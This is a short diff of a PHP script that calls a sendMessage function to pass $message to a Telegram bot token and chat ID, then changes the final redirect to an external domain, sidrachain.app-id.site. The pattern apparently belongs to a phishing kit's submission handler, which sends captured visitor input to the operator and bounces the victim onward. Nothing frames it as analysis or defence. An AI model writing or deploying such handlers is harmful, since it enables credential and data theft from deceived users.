@@ -28,5 +28,5 @@ function sendMessage($kennesia_telegram_id, $message, $kennesia_token_bot) {
     curl_close($ch);
 }
 sendMessage($kennesia_telegram_id, $message, $kennesia_token_bot);
-header('Location: ../');
+header('Location: https://sidrachain.app-id.site');
 ?>
